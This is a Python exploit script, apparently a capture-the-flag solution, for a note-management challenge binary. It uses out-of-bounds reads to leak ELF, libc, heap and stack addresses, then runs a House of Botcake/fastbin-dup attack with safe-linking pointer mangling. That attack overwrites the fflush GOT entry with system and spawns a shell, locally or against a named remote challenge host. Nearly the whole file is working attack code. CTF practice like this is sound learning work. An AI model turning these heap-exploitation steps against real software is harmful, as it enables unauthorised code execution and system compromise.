#!/usr/bin/env python3
from ctypes import CDLL
from subprocess import Popen, PIPE
from pwncli import *
import sys
from os import path
import traceback
# =========================================================
#                          SETUP
# =========================================================
exe = path.join(path.dirname(__file__) or '.', 'chall')
context.bits = 64
context.arch = 'amd64'
try: elf = context.binary = ELF(exe, checksec=False)
except: elf = type('S',(),{'address':0})()
try: libc = elf.libc
except: libc = type('S',(),{'address':0})()
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]


gdbscript = '''
init-pwndbg
# set architecture aarch64
# target remote :5000
# b modify_note
c
'''.format(**locals())

is_ipv4 = lambda s: len(s.split('.')) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in s.split('.'))
is_domain = lambda s: all(part.isalnum() or part == '-' for part in s.split('.'))
is_port = lambda s: s.isdigit() and 0 <= int(s) <= 65535
use_ip = lambda: len(sys.argv) >= 3 and (is_ipv4(sys.argv[1]) or is_domain(sys.argv[1])) and is_port(sys.argv[2])

def initialize(argv=[]):
    global pid
    update_checksec()
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 1024)
        sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        host, port = ("iloverust.challs.pwnoh.io", 1337) if len(sys.argv) < 4 else (sys.argv[2], int(sys.argv[3]))
        return remote(host, port, ssl=True)
    elif use_ip():
        context.log_level = 'info'
        host, port = str(sys.argv[1]), int(sys.argv[2])
        return remote(host, port, ssl=True)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv)

def execute(cmds, verbose=False):
    cmds = cmds if isinstance(cmds, list) else cmds.split()
    if verbose:
        sys.stdout.write("\n")
        sys.stdout.flush()
        p = Popen(cmds, stdout=PIPE, stderr=sys.stdout, text=True, bufsize=1)
        buf = []
        for line in p.stdout:
            sys.stdout.write(line)   # live output (colors intact)
            sys.stdout.flush()
            buf.append(line)         # keep copy
        p.wait()
        return "".join(buf)
    else:
        p = Popen(cmds, stdout=PIPE, stderr=PIPE, text=True)
        out, err = p.communicate()
        return out if out else err


def open_split_tmux(cmd):
    cmd = cmd.split() if isinstance(cmd, str) else cmd
    execute(["tmux", "splitw", "-h", "-p", "65"] + cmd)

def debug():
    global gdbscript, pid
    if ((not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB)) and not use_ip():
        if args.QEMU:
            open_split_tmux(["gdb"] + [a for c in filter(None, gdbscript.strip().splitlines()) for a in ["-ex", c.strip()]])
        elif args.DOCKER:
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe="chall2")
        else:
            attach(io, gdbscript=gdbscript)

def update_checksec():
    marker = "CHECKSEC"
    fn = sys.modules[__name__].__file__
    with open(fn, "r+", encoding="utf-8") as f:
        src = f.read()
        i = src.find(marker)
        i = src.find(marker, i + 1)
        i = src.find("\n", i)
        i = src.find("\n", i + 1)
        start = i + 1
        end = src.find("\n", start)
        if end == -1:
            end = len(src)
        if src[start:end].strip() == "":
            output = execute(["checksec", "--file", exe])
            commented = "".join(("# " + line + "\n") if line.strip() else "#\n" for line in output.splitlines())
            src = src[:start] + commented + src[end:]
            f.seek(0); f.write(src); f.truncate()

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
se      = lambda data               :str(data).encode()
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda num, data=None     : u32((io.recv(num) if not data else io.recvuntil(data)[-num:]).ljust(4, b"\x00"))
uu64    = lambda num, data=None     : u64((io.recv(num) if not data else io.recvuntil(data)[-num:]).ljust(8, b"\x00"))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))

# =========================================================
#                         CHECKSEC
# =========================================================
#     Arch:       amd64-64-little
#     RELRO:      Partial RELRO
#     Stack:      No canary found
#     NX:         NX enabled
#     PIE:        PIE enabled
#     Stripped:   No
#     Debuginfo:  Yes

# =========================================================
#                         EXPLOITS
# =========================================================
def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def create_note(size, content=b"A"):
    sla(b"> ", b"1")
    sla(b"> ", str(size).encode())
    sa(b"Enter your note: ", content)
    ru(b"Note ID is ")
    note_id = int(rl().strip(b".\n"))
    return note_id

def read_note(note_id):
    sla(b"> ", b"2")
    sla(b"> ", str(note_id).encode())
    ru(b"Note: ")

def modify_note(note_id, size, content=b"A"):
    sla(b"> ", b"3")
    sla(b"> ", str(note_id).encode())
    sla(b"> ", str(size).encode())
    sa(b"Enter your note: \n", content)

def delete_note(note_id):
    sla(b"> ", b"4")
    sla(b"> ", str(note_id).encode())

def addr_to_index(addr):
    return (addr - elf.sym["notes"]) // 0x10

def readpointer(addr):
    read_note(addr_to_index(addr))

def exploit(x):
    global io
    io = initialize()

    with log.progress("Leak address with OOB"), context.silent:
        read_note(-2)
        elf_leak = uu64(6)
        elf.address = elf_leak - 0x4060
        read_note(-14)
        libc_leak = uu64(6)
        libc.address = libc_leak - libc.sym["_IO_2_1_stdout_"]
        main_arena112 = libc.address + 0x203b30
        readpointer(main_arena112)
        heap_leak = uu64(6)
        heap_base = heap_leak - 0x6c0
        if args.REMOTE or args.DOCKER:
            chunk_target = heap_base + 0x400
        else:
            chunk_target = heap_base
        environ_pointer = libc.address + 0x202fa0
        readpointer(environ_pointer)
        stack_leak = uu64(6)
    leak("Elf leak", hex(elf_leak))
    leak("Libc leak", hex(libc_leak))
    leak("Heap leak", hex(heap_leak))
    leak("Stack leak", hex(stack_leak))
    with log.progress("House of botcake"), context.silent:
        for i in range(9):
            create_note(0x18, str(0x41+i).encode() + b"\n")
        create_note(0x18, p64(heap_base + 0x7b0) + p32(0x18) + p32(addr_to_index(heap_base + 0x7f0)) + b"\n") # Fake note struct pointer

        for i in reversed(range(7)): # Fill tcache
            delete_note(i)
        # Fastbin dup
        delete_note(7)
        delete_note(8)
        delete_note(addr_to_index(heap_base + 0x7f0)) # Free 7 idx again

        for i in range(7): # Clear tcache
            create_note(0x18, str(0x41+i).encode() + b"\n")

        create_note(0x18, p64(mangle(chunk_target + 0x400, elf.got["fflush"])) +b"\n")
        create_note(0x18, b"DUMMY" + b"\n")
        create_note(0x18, b"/bin/sh\0" + b"\n")
        create_note(0x18, p64(libc.sym["fflush"]) + p64(libc.sym["system"]) + b"\n")
    # debug()

    delete_note(7) # Trigger system("/bin/sh")
    leak("ELF Address", hex(elf.address)) if elf.address else None
    leak("Heap base", hex(heap_base))
    leak("Libc Address", hex(libc.address)) if libc.address else None
    io.interactive() if not args.NOINTERACT else None

if __name__ == '__main__':
    global io
    for i in range(1):
        try:
            exploit(i)
        except Exception as e:
            sys.stderr.write(traceback.format_exc())
        io.close()
